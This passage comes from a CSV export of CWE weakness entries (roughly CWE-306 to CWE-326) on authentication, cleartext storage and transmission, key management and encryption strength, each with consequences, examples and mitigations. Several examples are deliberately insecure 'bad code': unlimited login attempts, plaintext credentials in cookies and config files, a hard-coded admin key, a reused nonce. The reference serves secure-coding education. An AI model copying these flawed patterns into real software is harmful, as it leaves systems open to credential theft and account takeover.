Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]","Phase:  Architecture and DesignDivide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  Architecture and DesignWhere possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].Phases:  Implementation; System Configuration; OperationWhen storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302]."
CWE-307: Improper Restriction of Excessive Authentication Attempts,"The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismAn attacker could perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account., Likelihood: ","Example 1In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.Example 1 References:[REF-236] Kim Zetter. ""Weak Password Brings 'Happiness' to Twitter Hacker"". 2009-01-09. 
				<https://www.wired.com/2009/01/professed-twitt/>.URL validated: 2023-04-07.Example 2The following code, extracted from a servlet's doPost() method, performs an authentication lookup every time the servlet is invoked.(bad code)Example Language:JavaString username = request.getParameter(""username"");String password = request.getParameter(""password"");int authResult = authenticateUser(username, password);However, the software makes no attempt to restrict excessive authentication attempts.Example 3This code attempts to limit the number of login attempts by causing the process to sleep before completing the authentication.(bad code)Example Language:PHP$username = $_POST['username'];$password = $_POST['password'];sleep(2000);$isAuthenticated = authenticateUser($username, $password);However, there is no limit on parallel connections, so this does not increase the amount of time an attacker needs to complete an attack.Example 4In the following C/C++ example the validateUser method opens a socket connection, reads a username and password from the socket and attempts to authenticate the username and password.(bad code)Example Language:Cint validateUser(char *host, int port){int socket = openSocketConnection(host, port);if (socket < 0) {printf(""Unable to open socket connection"");return(FAIL);}int isValidUser = 0;char username[USERNAME_SIZE];char password[PASSWORD_SIZE];while (isValidUser == 0) {if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {isValidUser = AuthenticateUser(username, password);}}}return(SUCCESS);}The validateUser method will continuously check for a valid username and password without any restriction on the number of authentication attempts made. The method should limit the number of authentication attempts made to prevent brute force attacks as in the following example code.(good code)Example Language:Cint validateUser(char *host, int port){...int count = 0;while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {isValidUser = AuthenticateUser(username, password);}}count++;}if (isValidUser) {return(SUCCESS);}else {return(FAIL);}}Example 5Consider this example from a real-world attack against the iPhone [REF-1218]. An attacker can use brute force methods; each time there is a failed guess, the attacker quickly cuts the power before the failed entry is recorded, effectively bypassing the intended limit on the number of failed authentication attempts. Note that this attack requires removal of the cell phone battery and connecting directly to the phone's power source, and the brute force attack is still time-consuming.",Phase:  Architecture and DesignCommon protection mechanisms include:Disconnecting the user after a small number of failed attemptsImplementing a timeoutLocking out a targeted accountRequiring a computational task on the user's part.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator. [REF-45]
CWE-308: Use of Single-factor Authentication,The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf the secret in a single-factor authentication scheme gets compromised, full authentication is possible., Likelihood: ","Example 1In both of these examples, a user is logged in if their given password matches a stored password:(bad code)Example Language:Cunsigned char *check_passwd(char *plaintext) {ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );//Login if hash matches stored hashif (equal(ctext, secret_password())) {login_user();}}(bad code)Example Language:JavaString plainText = new String(plainTextIn);MessageDigest encer = MessageDigest.getInstance(""SHA"");encer.update(plainTextIn);byte[] digest = password.digest();//Login if hash matches stored hashif (equal(digest,secret_password())) {login_user();}This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328). It also does not use a salt (CWE-759).","Phase:  Architecture and DesignUse multiple independent authentication schemes, which ensures that -- if one of the methods is compromised -- the system itself is still likely safe from compromise."
CWE-309: Use of Password System for Primary Authentication,"The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityA password authentication mechanism error will almost always result in attackers being authorized as valid users., Likelihood: ","Example 1In both of these examples, a user is logged in if their given password matches a stored password:(bad code)Example Language:Cunsigned char *check_passwd(char *plaintext) {ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );//Login if hash matches stored hashif (equal(ctext, secret_password())) {login_user();}}(bad code)Example Language:JavaString plainText = new String(plainTextIn);MessageDigest encer = MessageDigest.getInstance(""SHA"");encer.update(plainTextIn);byte[] digest = password.digest();//Login if hash matches stored hashif (equal(digest,secret_password())) {login_user();}This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328). It also does not use a salt (CWE-759).","Phase:  Architecture and DesignIn order to protect password systems from compromise, the following should be noted:Passwords should be stored safely to prevent insider attack and to ensure that -- if a system is compromised -- the passwords are not retrievable. Due to password reuse, this information may be useful in the compromise of other systems these users work with. In order to protect these passwords, they should be stored encrypted, in a non-reversible state, such that the original text password cannot be extracted from the stored value.Password aging should be strictly enforced to ensure that passwords do not remain unchanged for long periods of time. The longer a password remains in use, the higher the probability that it has been compromised. For this reason, passwords should require refreshing periodically, and users should be informed of the risk of passwords which remain in use for too long.Password strength should be enforced intelligently. Rather than restrict passwords to specific content, or specific length, users should be encouraged to use upper and lower case letters, numbers, and symbols in their passwords. The system should also ensure that no passwords are derived from dictionary words.Phase:  Architecture and DesignUse a zero-knowledge password protocol, such as SRP.Phase:  Architecture and DesignEnsure that passwords are stored safely and are not reversible.Phase:  Architecture and DesignImplement password aging functionality that requires passwords be changed after a certain point.Phase:  Architecture and DesignUse a mechanism for determining the strength of a password and notify the user of weak password use.Phase:  Architecture and DesignInform the user of why password protections are in place, how they work to protect data integrity, and why it is important to heed their warnings."
CWE CATEGORY: Cryptographic Issues,"Weaknesses in this category are related to the design and implementation of data confidentiality and integrity. Frequently these deal with the use of encoding techniques, encryption libraries, and hashing algorithms. The weaknesses in this category could lead to a degradation of the quality data if they are not addressed.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-311: Missing Encryption of Sensitive Data,The product does not encrypt sensitive or critical information before storage or transmission.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Modify Application DataOmitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it., Likelihood: ","Example 1This code writes a user's login information to a cookie so the user does not have to login again later.(bad code)Example Language:PHPfunction persistLogin($username, $password){$data = array(""username"" => $username, ""password""=> $password);setcookie (""userdata"", $data);}The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).Example 2The following code attempts to establish a connection, read in a password, then store it to a buffer.(bad code)Example Language:Cserver.sin_family = AF_INET; hp = gethostbyname(argv[1]);if (hp==NULL) error(""Unknown host"");memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);if (argc < 3) port = 80;else port = (unsigned short)atoi(argv[3]);server.sin_port = htons(port);if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(""Connecting"");...while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {write(dfd,password_buffer,n);...While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.Example 3The following code attempts to establish a connection to a site to communicate sensitive information.(bad code)Example Language:Javatry {URL u = new URL(""http://www.secret.example.org/"");HttpURLConnection hu = (HttpURLConnection) u.openConnection();hu.setRequestMethod(""PUT"");hu.connect();OutputStream os = hu.getOutputStream();hu.disconnect();}catch (IOException e) {//...}Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.","Phase:  RequirementsClearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.Phase:  Architecture and DesignEnsure that encryption is properly integrated into the system design, including but not necessarily limited to:Encryption that is needed to store or transmit private data of the users of the systemEncryption that is needed to protect the system itself from unauthorized disclosure or tamperingIdentify the separate needs and contexts for encryption:One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the product) does not need to have access to a private key.Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]Phase:  Architecture and DesignStrategy:  Libraries or FrameworksWhen there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.For example, US government systems require FIPS 140-2 certification.Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phases:  Implementation; Architecture and DesignWhen using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.Phase:  ImplementationStrategy:  Attack Surface ReductionUse naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.Effectiveness: Defense in DepthNote:This makes it easier to spot places in the code where data is being used that is unencrypted."
CWE-312: Cleartext Storage of Sensitive Information,The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataAn attacker with access to the system could read sensitive information stored in cleartext., Likelihood: ","Example 1The following code excerpt stores a plaintext user account ID in a browser cookie.(bad code)Example Language:Javaresponse.addCookie( new Cookie(""userAccountID"", acctID);Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.Example 2This code writes a user's login information to a cookie so the user does not have to login again later.(bad code)Example Language:PHPfunction persistLogin($username, $password){$data = array(""username"" => $username, ""password""=> $password);setcookie (""userdata"", $data);}The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).Example 3The following code attempts to establish a connection, read in a password, then store it to a buffer.(bad code)Example Language:Cserver.sin_family = AF_INET; hp = gethostbyname(argv[1]);if (hp==NULL) error(""Unknown host"");memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);if (argc < 3) port = 80;else port = (unsigned short)atoi(argv[3]);server.sin_port = htons(port);if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(""Connecting"");...while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {write(dfd,password_buffer,n);...While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.Example 4The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.Example 5In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.At least one OT product stored a password in plaintext.Example 6In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.(bad code)Example Language:OtherA security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.(good code)Example Language:OtherThe sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]Example 7Consider the following PowerShell command examples for encryption scopes of Azure storage objects. In the first example, an encryption scope is set for the storage account.(bad code)Example Language:ShellNew-AzStorageEncryptionScope -ResourceGroupName ""MyResourceGroup"" -AccountName ""MyStorageAccount"" -EncryptionScopeName testscope -StorageEncryptionThe result (edited and formatted for readability) might be:(bad code)Example Language:OtherResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccountNameStateSourceRequireInfrastructureEncryptiontestscopeEnabledMicrosoft.StorageHowever, the empty string under RequireInfrastructureEncryption indicates this service was not enabled at the time of creation, because the -RequireInfrastructureEncryption argument was not specified in the command.Including the -RequireInfrastructureEncryption argument addresses the issue:(good code)Example Language:ShellNew-AzStorageEncryptionScope -ResourceGroupName ""MyResourceGroup"" -AccountName ""MyStorageAccount"" -EncryptionScopeName testscope -StorageEncryption -RequireInfrastructureEncryptionThis produces the report:(result)Example Language:OtherResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccountNameStateSourceRequireInfrastructureEncryptiontestscopeEnabledMicrosoft.KeyvaultTrueIn a scenario where both software and hardware layer encryption is required (""double encryption""), Azure's infrastructure encryption setting can be enabled via the CLI or Portal. An important note is that infrastructure hardware encryption cannot be enabled or disabled after a blob is created. Furthermore, the default value for infrastructure encryption is disabled in blob creations.","Phases:  Implementation; System Configuration; OperationWhen storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to encrypt the data at rest. [REF-1297] [REF-1299] [REF-1301]"
CWE-313: Cleartext Storage in a File or on Disk,"The product stores sensitive information in cleartext in a file, or on disk.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.",无可能的缓解方案
CWE-314: Cleartext Storage in the Registry,The product stores sensitive information in cleartext in the registry.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-315: Cleartext Storage of Sensitive Information in a Cookie,The product stores sensitive information in cleartext in a cookie.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code excerpt stores a plaintext user account ID in a browser cookie.(bad code)Example Language:Javaresponse.addCookie( new Cookie(""userAccountID"", acctID);Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.",无可能的缓解方案
CWE-316: Cleartext Storage of Sensitive Information in Memory,The product stores sensitive information in cleartext in memory.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: ",无示范例子,无可能的缓解方案
CWE-317: Cleartext Storage of Sensitive Information in GUI,The product stores sensitive information in cleartext within the GUI.,"Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-318: Cleartext Storage of Sensitive Information in Executable,The product stores sensitive information in cleartext in an executable.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-319: Cleartext Transmission of Sensitive Information,The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.,"Scope: IntegrityConfidentiality, Impact: Technical Impact:Read Application Data; Modify Files or DirectoriesAnyone can read the information by gaining access to the channel being used for communication., Likelihood: ","Example 1The following code attempts to establish a connection to a site to communicate sensitive information.(bad code)Example Language:Javatry {URL u = new URL(""http://www.secret.example.org/"");HttpURLConnection hu = (HttpURLConnection) u.openConnection();hu.setRequestMethod(""PUT"");hu.connect();OutputStream os = hu.getOutputStream();hu.disconnect();}catch (IOException e) {//...}Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.Example 2In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used cleartext transmission of sensitive information in their OT products.Example 3A TAP accessible register is read/written by a JTAG based tool, for internal use by authorized users. However, an adversary can connect a probing device and collect the values from the unencrypted channel connecting the JTAG interface to the authorized user, if no additional protections are employed.Example 4The following Azure CLI command lists the properties of a particular storage account:(informative)Example Language:Shellaz storage account show -g {ResourceGroupName} -n {StorageAccountName}The JSON result might be:(bad code)Example Language:JSON{""name"": ""{StorageAccountName}"",""enableHttpsTrafficOnly"": false,""type"": ""Microsoft.Storage/storageAccounts""}The enableHttpsTrafficOnly value is set to false, because the default setting for Secure transfer is set to Disabled. This allows cloud storage resources to successfully connect and transfer data without the use of encryption (e.g., HTTP, SMB 2.1, SMB 3.0, etc.).Azure's storage accounts can be configured to only accept requests from secure connections made over HTTPS. The secure transfer setting can be enabled using Azure's Portal (GUI) or programmatically by setting the enableHttpsTrafficOnly property to True on the storage account, such as:(good code)Example Language:Shellaz storage account update -g {ResourceGroupName} -n {StorageAccountName} --https-only trueThe change can be confirmed from the result by verifying that the enableHttpsTrafficOnly value is true:(good code)Example Language:JSON{""name"": ""{StorageAccountName}"",""enableHttpsTrafficOnly"": true,""type"": ""Microsoft.Storage/storageAccounts""}Note: to enable secure transfer using Azure's Portal instead of the command line:Open the Create storage account pane in the Azure portal.In the Advanced page, select the Enable secure transfer checkbox.","Phase:  Architecture and DesignBefore transmitting, encrypt the data using reliable, confidentiality-protecting cryptographic protocols.Phase:  ImplementationWhen using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.Phase:  ImplementationWhen designing hardware platforms, ensure that approved encryption algorithms (such as those recommended by NIST) protect paths from security critical data to trusted user applications.Phase:  TestingUse tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.Phase:  OperationConfigure servers to use encrypted channels for communication, which may include SSL or other secure protocols."
CWE CATEGORY: Key Management Errors,Weaknesses in this category are related to errors in the management of cryptographic keys.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-321: Use of Hard-coded Cryptographic Key,The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityIf hard-coded cryptographic keys are used, it is almost certain that malicious users will gain access through the account in question., Likelihood: ","Example 1The following code examples attempt to verify a password using a hard-coded cryptographic key.(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(password,""68af404b513073584c4b6f22b6c63e6b"")) {printf(""Incorrect Password!\n"");return(0);}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javapublic boolean VerifyAdmin(String password) {if (password.equals(""68af404b513073584c4b6f22b6c63e6b"")) {System.out.println(""Entering Diagnostic Mode..."");return true;}System.out.println(""Incorrect Password!"");return false;(bad code)Example Language:C#int VerifyAdmin(String password) {if (password.Equals(""68af404b513073584c4b6f22b6c63e6b"")) {Console.WriteLine(""Entering Diagnostic Mode..."");return(1);}Console.WriteLine(""Incorrect Password!"");return(0);}The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.Example 2In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used hard-coded keys for critical functionality in their OT products.",Phase:  Architecture and DesignPrevention schemes mirror that of hard-coded password storage.
CWE-322: Key Exchange without Entity Authentication,The product performs a key exchange with an actor without verifying the identity of that actor.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismNo authentication takes place in this process, bypassing an assumed protection of encryption., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe encrypted communication between a user and a trusted host may be subject to sniffing by any actor in the communication path., Likelihood: ","Example 1Many systems have used Diffie-Hellman key exchange without authenticating the entities exchanging keys, allowing attackers to influence communications by redirecting or interfering with the communication path.  Many people using SSL/TLS skip the authentication (often unknowingly).",Phase:  Architecture and DesignEnsure that proper authentication is included in the system design.Phase:  ImplementationUnderstand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.
"CWE-323: Reusing a Nonce, Key Pair in Encryption",Nonces should be used for the present occasion and only once.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityPotentially a replay attack, in which an attacker could send the same data twice, could be crafted if nonces are allowed to be reused. This could allow a user to send a message which masquerades as a valid message from a valid user., Likelihood: ","Example 1This code takes a password, concatenates it with a nonce, then encrypts it before sending over a network:(bad code)Example Language:Cvoid encryptAndSendPassword(char *password){char *nonce = ""bad"";...char *data = (unsigned char*)malloc(20);int para_size = strlen(nonce) + strlen(password);char *paragraph = (char*)malloc(para_size);SHA1((const unsigned char*)paragraph,parsize,(unsigned char*)data);sendEncryptedData(data)}Because the nonce used is always the same, an attacker can impersonate a trusted party by intercepting and resending the encrypted password. This attack avoids the need to learn the unencrypted password.Example 2This code sends a command to a remote server, using an encrypted password and nonce to prove the command is from a trusted party:(bad code)Example Language:C++String command = new String(""some command to execute"");MessageDigest nonce = MessageDigest.getInstance(""SHA"");nonce.update(String.valueOf(""bad nonce""));byte[] nonce = nonce.digest();MessageDigest password = MessageDigest.getInstance(""SHA"");password.update(nonce + ""secretPassword"");byte[] digest = password.digest();sendCommand(digest, command)Once again the nonce used is always the same. An attacker may be able to replay previous legitimate commands or execute new arbitrary commands.","Phase:  ImplementationRefuse to reuse nonce values.Phase:  ImplementationUse techniques such as requiring incrementing, time based and/or challenge response to assure uniqueness of nonces."
CWE-324: Use of a Key Past its Expiration Date,"The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityThe cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim., Likelihood: ","Example 1The following code attempts to verify that a certificate is valid.(bad code)Example Language:Cif (cert = SSL_get_peer_certificate(ssl)) {foo=SSL_get_verify_result(ssl);if ((X509_V_OK==foo) || (X509_V_ERRCERT_NOT_YET_VALID==foo))//do stuff}The code checks if the certificate is not yet valid, but it fails to check if a certificate is past its expiration date, thus treating expired certificates as valid.","Phase:  Architecture and DesignAdequate consideration should be put in to the user interface in order to notify users previous to the key's expiration, to explain the importance of new key generation and to walk users through the process as painlessly as possible."
CWE-325: Missing Cryptographic Step,"The product does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by the algorithm.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ; Scope: AccountabilityNon-Repudiation, Impact: Technical Impact:Hide Activities, Likelihood: ","Example 1The example code is taken from the HMAC engine inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1358]. HAMC is a message authentication code (MAC) that uses both a hash and a secret crypto key. The HMAC engine in HACK@DAC SoC uses the SHA-256 module for the calculation of the HMAC for 512 bits messages.(bad code)Example Language:Veriloglogic [511:0] bigData;...hmac hmac(.clk_i(clk_i),.rst_ni(rst_ni && ~rst_4),.init_i(startHash && ~startHash_r),.key_i(key),.ikey_hash_i(ikey_hash),.okey_hash_i(okey_hash),.key_hash_bypass_i(key_hash_bypass),.message_i(bigData),.hash_o(hash),.ready_o(ready),.hash_valid_o(hashValid)However, this HMAC engine cannot handle messages that are longer than 512 bits. Moreover, a complete HMAC will contain an iterate hash function that breaks up a message into blocks of a fixed size and iterates over them with a compression function (e.g., SHA-256). Therefore, the implementation of the HMAC in OpenPiton SoC is incomplete. Such HMAC engines will not be used in real-world applications as the messages will usually be longer than 512 bits. For instance, OpenTitan offers a comprehensive HMAC implementation that utilizes a FIFO for temporarily storing the truncated message, as detailed in [REF-1359].To mitigate this, implement the iterative function to break up a message into blocks of a fixed size.",无可能的缓解方案
CWE-326: Inadequate Encryption Strength,"The product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.","Scope: Access ControlConfidentiality, Impact: Technical Impact:Bypass Protection Mechanism; Read Application DataAn attacker may be able to decrypt the data using brute force attacks., Likelihood: ",无示范例子,Phase:  Architecture and DesignUse an encryption scheme that is currently considered to be strong by experts in the field.
